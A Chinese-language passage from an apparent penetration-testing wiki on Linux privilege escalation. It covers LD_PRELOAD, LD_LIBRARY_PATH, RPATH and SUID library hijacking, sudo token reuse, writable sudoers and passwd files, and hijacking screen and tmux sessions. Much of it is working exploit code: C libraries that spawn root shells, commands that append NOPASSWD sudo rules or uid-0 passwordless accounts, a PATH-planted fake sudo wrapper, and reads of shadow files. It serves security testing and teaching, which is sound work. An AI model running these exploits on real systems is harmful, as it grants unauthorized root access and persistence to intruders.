### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 环境变量用于指定一个或多个共享库（.so 文件），由 loader 在其他所有库之前加载，包括标准 C 库（`libc.so`）。这个过程称为预加载库。

然而，为了维护系统安全并防止此功能被利用，尤其是针对 **suid/sgid** 可执行文件，系统会强制执行以下条件：

- 对于真实用户 ID（_ruid_）与有效用户 ID（_euid_）不匹配的可执行文件，loader 会忽略 **LD_PRELOAD**。
- 对于带有 suid/sgid 的可执行文件，只有位于标准路径且本身也带有 suid/sgid 的库才会被预加载。

如果你能够使用 `sudo` 执行命令，且 `sudo -l` 的输出中包含 **env_keep+=LD_PRELOAD**，就可能发生权限提升。此配置允许 **LD_PRELOAD** 环境变量保留，并在通过 `sudo` 运行命令时继续生效，从而可能以提升后的权限执行任意代码。<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

保存为 **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

然后使用以下命令**编译它**：

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

最后，**通过运行来提升权限**。

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> 如果攻击者控制 **LD_LIBRARY_PATH** 环境变量，也可以滥用类似的 privesc，因为他可以控制搜索库的路径。

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID 二进制文件 – .so injection

遇到一个权限设置为 **SUID** 且看起来不太寻常的二进制文件时，最好确认它是否正确加载 **.so** 文件。可以运行以下命令进行检查：<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，说明可能存在可利用之处。

要 exploit 这一点，可以先创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

这段代码在编译并执行后，旨在通过操纵文件权限并以提升后的权限执行 shell 来实现权限提升。

使用以下命令将上述 C 文件编译为共享对象（.so）文件：

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

最后，运行受影响的 SUID 二进制文件即可触发 exploit，可能导致系统遭到入侵。

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

现在我们已经找到一个 SUID 二进制文件，它会从我们有写入权限的文件夹加载库。接下来，在该文件夹中创建一个名称符合要求的库：

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

如果遇到类似这样的错误，

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

这意味着你生成的库需要有一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个精选的 Unix 二进制文件列表，攻击者可以利用其中的文件绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 也一样，但适用于**只能注入参数**的情况。

该项目收集了 Unix 二进制文件的合法功能，这些功能可被滥用来逃出受限 shell、提升或维持高权限、传输文件、启动 bind 和 reverse shell，以及协助完成其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以访问 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 检查它是否能找到利用任何 sudo 规则的方法。

### 重用 Sudo Token

如果你有 **sudo 访问权限**但没有密码，可以**等待 sudo 命令执行，然后劫持会话 token** 来提升权限。<sup>[[18]](#references)</sup>

提升权限的要求：

- 你已经拥有一个以用户 "_sampleuser_" 身份运行的 shell
- "_sampleuser_" 在**最近 15 分钟内使用过 `sudo`**（默认情况下，sudo token 的有效期为 15 分钟，在此期间我们可以使用 `sudo` 而无需输入密码）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的结果为 0
- `gdb` 可用（你能够上传它）

（你可以通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 临时启用 `ptrace_scope`，或永久修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0`）

如果满足所有这些要求，**你可以使用以下工具提升权限：**[**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **第一个 exploit**（`exploit.sh`）会在 _/tmp_ 中创建二进制文件 `activate_sudo_token`。你可以用它**在当前会话中激活 sudo token**（它不会自动为你打开 root shell，请执行 `sudo su`）：

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **第二个 exploit**（`exploit_v2.sh`）会在 _/tmp_ 中创建一个 **由 root 拥有并设置了 setuid 的** sh shell 񟿿

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **第三个 exploit**（`exploit_v3.sh`）会**创建一个 sudoers 文件**，使 **sudo tokens 永不过期，并允许所有用户使用 sudo**。

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

如果你对该文件夹或其中创建的任何文件拥有**写入权限**，就可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 为用户和 PID **创建 sudo token**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且有一个以该用户身份运行、PID 为 1234 的 shell，就可以**获取 sudo 权限**，而无需知道密码：

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 和 `/etc/sudoers.d` 中的文件用于配置哪些用户可以使用 `sudo` 以及如何使用。默认情况下，这些文件**仅允许 root 用户和 root 组读取**。\
**如果**你可以**读取**此文件，就可能**获取一些有用的信息**；如果你可以**写入**任何文件，就能够**提升权限**。

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

如果你有写入权限，就可以滥用它。

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

滥用这些权限的另一种方式：

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

`sudo` 二进制文件有一些替代品，例如 OpenBSD 的 `doas`。记得检查其配置文件 `/etc/doas.conf`。

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

如果 `doas` 允许使用编辑器或解释器，请检查 GTFOBins 风格的逃逸方式：

```bash
doas vim
:!/bin/sh
```

支持 root 的 `doas` 规则也值得检查原始 Python 版 `dstat` 的插件路径。[手册](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1)和[源码](https://github.com/dstat-real/dstat/blob/master/dstat)将 `/usr/share/dstat/` 和 `/usr/local/share/dstat/` 列为 `dstat_*.py` 插件的存放位置。如果当前用户可以写入并搜索已安装版本实际使用的位置，选定的插件可能会以 `doas` 的 RunAs 身份运行。请确认有效规则、该版本中的插件查找方式、目录及父目录的权限或 ACL，以及调用者能否选择插件；仅有 `dstat` 规则或可写目录只能作为线索。其他 `dstat` 实现可能使用不同的插件系统。请被动检查元数据，不要加载插件。

### Sudo Hijacking

如果你知道某个**用户通常会连接到一台机器并使用 `sudo`** 来提升权限，而你已经在该用户上下文中获得了 shell，那么你可以**创建一个新的 sudo 可执行文件**，让它以 root 身份执行你的代码，然后再执行用户的命令。接着，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新路径），这样用户执行 sudo 时就会运行你的 sudo 可执行文件。

注意，如果用户使用的是其他 shell（不是 bash），你需要修改其他文件来添加新路径。例如，[sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你也可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个示例。

或者运行类似这样的命令：

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指明了**加载的配置文件来自哪里**。通常，此文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。这些配置文件**指向其他文件夹**，系统会在其中**搜索** **库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索库**。

如果**用户对**以下任一路径具有写入权限：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任意文件，或 `/etc/ld.so.conf.d/*.conf` 配置文件中指定的任意文件夹，该用户可能能够提权。\
请在以下页面查看**如何利用此错误配置**：


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

将 lib 复制到 `/var/tmp/flag15/` 后，程序会按照 `RPATH` 变量的指定使用该位置中的库。

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

然后使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` 在 `/var/tmp` 中创建一个恶意库。

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## 能力

Linux capabilities 为进程提供**一部分可用的 root 权限**。这实际上将 root **权限拆分为更小且互不相同的单元**。随后可以将这些单元分别授予进程。这样可以缩减完整的权限集合，降低被利用的风险。\
阅读以下页面，**进一步了解 capabilities 及其滥用方法**：


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**“执行”位**表示受影响的用户可以通过“**cd**”进入该文件夹。\
**“读取”位**表示用户可以**列出**其中的**文件**，而**“写入”位**表示用户可以**删除**和**创建**新的**文件**。

## ACL

访问控制列表（ACL）是自主权限控制的次级层，能够**覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝非所有者或非组成员的特定用户访问权，增强了对文件或目录访问的控制。这种**细粒度控制确保了更精确的访问管理**。更多详情请参阅[**此处**](https://linuxconfig.org/how-to-manage-acls-on-linux)。<sup>[[19]](#references)</sup>

**授予**用户 "kali" 对文件的读写权限：

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**从系统中获取具有特定 ACL 的文件：**

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-in 配置中的隐藏 ACL 后门

一种常见的错误配置是：`/etc/sudoers.d/` 中有一个归 root 所有、权限模式为 `440` 的文件，但它仍通过 ACL 授予低权限用户写入权限。

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

如果你看到类似 `user:alice:rw-` 的内容，尽管模式位受到限制，该用户仍可以追加一条 sudo 规则：

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

这是一条影响很大的 ACL 持久化/提权路径，因为在只通过 `ls -l` 检查时很容易漏掉。

## 打开的 shell 会话

跨用户访问 GNU Screen 取决于**正在运行的会话的配置和 ACL**，而不只是它的版本。[GNU Screen 文档](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html)指出，编译时必须启用 multiuser 支持；启用 `multiuser on`，并通过 `acladd` 或适当的 `aclchg` 授权，才能让其他用户连接。[手册还要求设置 setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html)，以支持跨用户会话查找。仅凭一个可见的 root 所有套接字或 SUID `screen` 二进制文件，并不能证明存在可连接的 root shell。在将其视为提权途径之前，请确认当前会话启用了 multiuser、当前用户拥有有效的输入/命令权限，并且该会话中的 shell 以特权所有者身份运行。

### screen 会话劫持

**列出 screen 会话**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Socket 位置（某些系统会将其中一个作为另一个的符号链接暴露）：ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**连接到会话**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux 会话劫持

这是**旧版 tmux 的一个问题**。我无法以非特权用户身份劫持由 root 创建的 tmux（v2.1）会话。

**列出 tmux 会话**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket 位置（某些系统会将其中一个暴露为另一个的符号链接）- tmux 会话劫持：tmux -S /tmp/dev sess ls 使用该 socket 列出会话，你可以在该 socket 中启动 tmux 会话……](<../../images/image (837).png>)

**连接到会话**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

检查 **HTB 的 Valentine box**，了解一个示例。

## SSH

### Debian OpenSSL 可预测 PRNG - CVE-2008-0166

在历史漏洞期间，使用受影响的 Debian 或其衍生版本的 OpenSSL 构建版本生成的密钥，可能具有可预测的随机性；主机当前的发行版或已修补的 OpenSSL 版本，并不能证明旧密钥是如何生成的。请使用适当的历史黑名单检查**具体密钥**，并核实其来源。Debian 的 [`ssh-vulnkey` 手册](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html)介绍了如何检查公钥和 `authorized_keys`；[DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1)记录了 OpenSSL 修复。特权账户的 `authorized_keys` 中有一条记录，只有在其对应的私钥可以恢复，且实际生效的 SSH 策略仍允许该账户使用此密钥时，才构成提权线索；较弱的**主机**密钥本身并不是登录凭据。请替换已泄露的密钥，并移除其旧授权。

### SSH 有趣的配置值

- **PasswordAuthentication：** 指定是否允许使用密码进行身份验证。上游 OpenSSH 默认值为 `yes`；发行版配置可能会覆盖此值。
- **PubkeyAuthentication：** 指定是否允许使用公钥进行身份验证。默认值为 `yes`。
- **PermitEmptyPasswords**：在允许密码身份验证时，指定服务器是否允许使用空密码字符串的账户登录。默认值为 `no`。

### 登录控制文件

这些文件会影响哪些用户可以登录以及登录方式：

- **`/etc/nologin`**：如果存在，则阻止非 root 用户登录，并显示其中的消息。
- **`/etc/securetty`**：限制 root 可以从哪些位置登录（TTY 允许列表）。
- **`/etc/motd`**：登录后的横幅（可能会 leak 环境或维护详情）。

### PermitRootLogin

指定 root 是否可以通过 ssh 登录。上游 OpenSSH 默认值为 `prohibit-password`；发行版配置可能会覆盖此值。可能的取值：

- `yes`：root 可以使用密码和私钥登录
- `without-password` 或 `prohibit-password`：root 只能使用私钥登录
- `forced-commands-only`：root 只能使用私钥登录，且必须指定 commands 选项
- `no`：不允许

### 受信任的 SSH 用户证书颁发机构

`TrustedUserCAKeys` 指定 sshd 信任哪些公钥可用于签署**用户**证书。如果低权限用户可以读取对应的私有 CA 密钥，请检查谁可以获取证书，以及证书可以用于以哪些账户主体进行身份验证。`AuthorizedPrincipalsFile` 或 `AuthorizedPrincipalsCommand` 可以限制可接受的名称；如果两者都未配置，证书必须包含目标账户名称。`PermitRootLogin prohibit-password` 会阻止 root 使用密码进行身份验证，但仍可能允许证书身份验证。仅发现一个暴露的密钥路径并不能证明可以访问：请确认公钥/私钥对、实际生效的 `Match` 规则、账户策略、密钥口令、吊销状态以及可接受的签名算法。不要在 enumeration 输出中包含私钥字节。请参阅 [OpenSSH 服务器配置手册](https://man.openbsd.org/sshd_config#TrustedUserCAKeys)。

如果特权委派规则允许当前用户以密钥所有者的身份调用不受限制的[证书签署工具，例如 `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s)，即使当前用户无法读取私有 CA 密钥，该密钥仍可能可用。请将精确允许的命令和参数，与签署者账户对密钥的访问权限、实际生效的 sshd 配置所信任的公有 CA、目标账户接受的主体、证书有效期以及该账户的登录策略一并核对。委派的签署命令或受信任的 CA 文件本身，并不能证明可以访问其他账户；请勿在被动 enumeration 期间签署测试证书。

### AuthorizedKeysFile

指定包含可用于用户身份验证的公钥的文件。它可以包含 `%h` 这类标记，系统会将其替换为主目录。**可以指定绝对路径**（以 `/` 开头）或**相对于用户主目录的路径**。例如：

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

该配置表示，如果你尝试使用用户“**testusername**”的**私钥**登录，ssh 会将你的密钥的公钥与 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 中的公钥进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你**使用本地 SSH 密钥，而不必将密钥（没有密码短语！）留在服务器上**。因此，你可以通过 ssh **跳转到一台主机**，再从那里**使用**位于**初始主机**上的**密钥**跳转到另一台主机。

你需要在 `$HOME/.ssh.config` 中设置此选项，如下所示：

```
Host example.com
  ForwardAgent yes
```

注意，如果 `Host` 是 `*`，每当用户跳转到另一台机器时，该主机就能访问这些密钥（这是一个安全问题）。

`/etc/ssh_config` 文件可以 **覆盖**这些**选项**，并允许或拒绝此配置。\
`/etc/sshd_config` 文件可以通过关键字 `AllowAgentForwarding` **允许**或**拒绝** ssh-agent 转发（默认允许）。

如果你发现某个环境中配置了 Forward Agent，请阅读以下页面，因为**你可能可以滥用它来提升权限**：


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### Profile 文件

`/etc/profile` 文件和 `/etc/profile.d/` 目录下的文件都是**用户启动新 shell 时执行的脚本**。因此，如果你能**写入或修改其中任何一个文件，就可以提升权限**。

```bash
ls -l /etc/profile /etc/profile.d/
```

如果发现任何奇怪的 profile 脚本，应检查其中是否包含**敏感信息**。

### Passwd/Shadow 文件

根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，也可能存在备份。因此，建议**找出所有此类文件**，并**检查是否能够读取**，以确认文件中**是否包含哈希值**：

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

有时你可以在 `/etc/passwd`（或同等文件）中找到**密码哈希**。

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### 可写的 /etc/passwd

首先，使用以下命令之一生成密码。

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

然后添加用户 hacker，并设置生成的密码。

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

例如：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在可以使用 `su` 命令并输入 `hacker:hacker`

或者，可以使用以下几行添加一个没有密码的虚拟用户。\
警告：这可能会降低当前机器的安全性。

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

注意：在 BSD 平台上，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，而 `/etc/shadow` 则重命名为 `/etc/spwd.db`。

你应该检查是否可以**写入某些敏感文件**。例如，你能否写入某个**服务配置文件**？

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

例如，如果机器正在运行 **tomcat** 服务器，并且你可以 **修改 /etc/systemd/ 中的 Tomcat 服务配置文件，** 那么你可以修改以下行：

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

下次启动 tomcat 时，你的 backdoor 将会执行。

### 检查目录

以下目录可能包含备份或有用信息：**/tmp**、**/var/tmp**、**/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（你可能无法读取最后一个目录，但还是试试）

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### 异常位置/当前用户拥有的文件

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### 最近几分钟内修改的文件

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite 数据库文件

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

对于可读取的应用程序数据库，请检查表名和列名，查找用户名和 password hashes。找到 hash、恢复其密码，以及证明该密码被本地账户复用，是三个独立步骤；仅凭一个通用的 32 位十六进制字符串，无法推断它是 MD5，也无法推断能访问账户。

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

如果可读的 shell history 中有一条 `sudo` 命令，后面紧跟一行看起来像密码的短文本，请手动检查其前后内容。输入到正常 `sudo` 提示符中的密码不会保存到 shell history；后续那一行只是可能意外输入到 shell 中的内容，并不能证明它是有效密码。`.sudo_as_admin_successful` 标记记录的是此前的使用情况，而非当前的授权状态。

### 隐藏文件

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH 中的脚本/二进制文件**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Web 文件**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **备份**

检查备份目录中的可读文件，以及**名称**中包含 `backup` 的文件：即使压缩包名称不透明或扩展名经过加密，其中仍可能暴露旧的应用程序数据。加密压缩包只是潜在的暴露点。恢复密码、检查压缩包内容、恢复应用程序哈希，以及将该密码用于 Unix 账户，都是需要分别验证的步骤；压缩包中的哈希并不能证明存在本地登录方式。

可读的虚拟机备份也应进行同样的检查。VirtualBox `.vbox` 配置文件可以标识已附加的 `.vdi` 镜像，并包含磁盘加密密钥元数据；[VirtualBox 文档说明，加密数据密钥存储在虚拟机配置文件中](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)。只有在配置文件和镜像都可访问时，才能离线检查磁盘。来宾卷可能还有单独的 [LUKS 加密层](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc)，需要另一个密钥。即使经过授权完成解密，旧脚本或配置文件中也可能包含密码；在将其认定为本地提权之前，应先确认该凭据当前仍适用于主机账户，且该账户生效的 `sudo` 策略允许执行特权命令。在被动枚举期间，只盘点路径和权限，不要复制、解密或挂载镜像。

检查可读压缩包时，先列出成员名称，再提取任何内容：其中可能有隐藏的验证器文件、恢复码材料或 SSH 密钥，即使当前使用的副本受到保护也是如此。文件名只能提供线索；应另外验证文件内容及账户凭据是否复用。

优先检查备份目录中**由其他用户拥有的可读压缩包**，尤其是 root 拥有的压缩包，以及可通过组成员身份访问的压缩包。即使当前使用的副本受到保护，旧压缩包仍可能包含配置或身份验证机密。对于 [Backrest](https://garethgeorge.github.io/backrest/) 这类本地备份 UI，应检查服务的有效账户，以及低权限用户能否读取其配置或通过 UI 进行身份验证。其 [hooks](https://garethgeorge.github.io/backrest/docs/hooks) 和 [restic 命令接口](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) 可以使用守护进程的文件和命令权限运行；仅有 loopback 监听地址并不能决定其影响。Backrest 的 `passwordBcrypt` 是 base64 编码的 bcrypt 哈希，定义于其[身份验证代码](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go)，并非明文密码。在将暴露的压缩包或 UI 视为权限边界之前，应确认服务身份、凭据是否可用，以及能否访问相关计划或存储库。

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### 已知包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索**多个可能包含密码的文件**。\
**另一个有用的工具**是 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用程序，可用于提取存储在 Windows、Linux 和 Mac 本地计算机上的大量密码。

如果 `/etc/guacamole/guacamole.properties` 可读，请检查其中的 `mysql-*`、`postgresql-*` 或 `sqlserver-*` 数据库连接设置。如果该账户有权限读取 Guacamole JDBC 表，`guacamole_connection_parameter` 可能包含已保存的 SSH `username`、`password`、`private-key` 或 `passphrase` 值。先检查连接 ID 和参数名称，再查看相关行；已保存的值可能是动态 token 或 vault 引用，而非可重复使用的 secret。参见 [Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) 和 [SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html)。

[pswm password manager](https://github.com/Julynx/pswm#usage) 默认会在 `~/.local/share/pswm/pswm` 存储加密 vault。如果能看到其他用户的 vault，请检查其所有权，以及当前账户是否确实有权读取它。仅凭 vault 路径无法得知凭据；恢复其 master password、找到可重复使用的账户密码，以及确认该账户的权限，是彼此独立的步骤。

